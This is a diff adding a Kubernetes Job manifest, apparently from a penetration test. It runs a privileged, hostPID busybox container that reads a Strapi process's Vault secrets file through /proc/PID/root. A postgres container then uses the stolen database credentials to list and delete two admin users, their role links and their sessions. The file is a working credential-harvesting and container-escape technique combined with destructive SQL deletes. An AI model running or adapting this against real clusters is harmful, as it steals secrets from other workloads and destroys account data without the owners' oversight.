@@ -1,0 +1,78 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: adminrm1
+  namespace: pentest-1148
+  labels:
+    purpose: pentest-1148
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 86400
+  template:
+    metadata:
+      labels:
+        purpose: pentest-1148
+    spec:
+      serviceAccountName: probe
+      restartPolicy: Never
+      nodeName: anubis-gateway-chatly-3akkk1
+      hostPID: true
+      volumes:
+      - name: shared
+        emptyDir: {}
+      containers:
+      - name: reader
+        image: busybox:1.36
+        securityContext:
+          privileged: true
+          runAsUser: 0
+        volumeMounts:
+        - name: shared
+          mountPath: /shared
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          for p in /proc/[0-9]*; do
+            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
+            case "$cmd" in
+              *strapi.js*start*)
+                cat $p/root/vault/secrets/config > /shared/config.env 2>/dev/null
+                echo "reader: pid ${p#/proc/}" > /shared/reader.log
+                break
+                ;;
+            esac
+          done
+          sleep 150
+      - name: psql
+        image: postgres:16-alpine
+        volumeMounts:
+        - name: shared
+          mountPath: /shared
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          for i in $(seq 1 60); do [ -s /shared/config.env ] && break; sleep 2; done
+          cat /shared/reader.log 2>&1
+          . /shared/config.env
+          export PGPASSWORD="$DATABASE_PASSWORD" PGHOST="$DATABASE_HOST" PGPORT="$DATABASE_PORT" PGDATABASE="$DATABASE_NAME" PGUSER="$DATABASE_USERNAME" PGSSLMODE=require
+          echo "##BEFORE_CNT"
+          psql -Atc "select count(*) from admin_users" 2>&1
+          echo "##BEFORE_ROWS"
+          psql -Atc "select id||'|'||email from admin_users order by id" 2>&1
+          echo "##BEFORE_LNK"
+          psql -Atc "select user_id||'|'||role_id from admin_users_roles_lnk where user_id in (115,116)" 2>&1
+          echo "##BEFORE_SESS"
+          psql -Atc "select id||'|'||user_id from strapi_sessions where user_id in ('115','116')" 2>&1
+          echo "##CLEAN"
+          psql -Atc "delete from strapi_sessions where user_id in ('115','116')" 2>&1
+          psql -Atc "delete from admin_users_roles_lnk where user_id in (115,116)" 2>&1
+          psql -Atc "delete from admin_users where id in (115,116)" 2>&1
+          echo "##AFTER_CNT"
+          psql -Atc "select count(*) from admin_users" 2>&1
+          echo "##AFTER_ROWS"
+          psql -Atc "select id||'|'||email from admin_users order by id" 2>&1
+          echo "##AFTER_LNK"
+          psql -Atc "select count(*) from admin_users_roles_lnk where user_id in (115,116)" 2>&1
+          echo "##AFTER_SESS"
+          psql -Atc "select count(*) from strapi_sessions where user_id in ('115','116')" 2>&1
+          echo "##DONE"
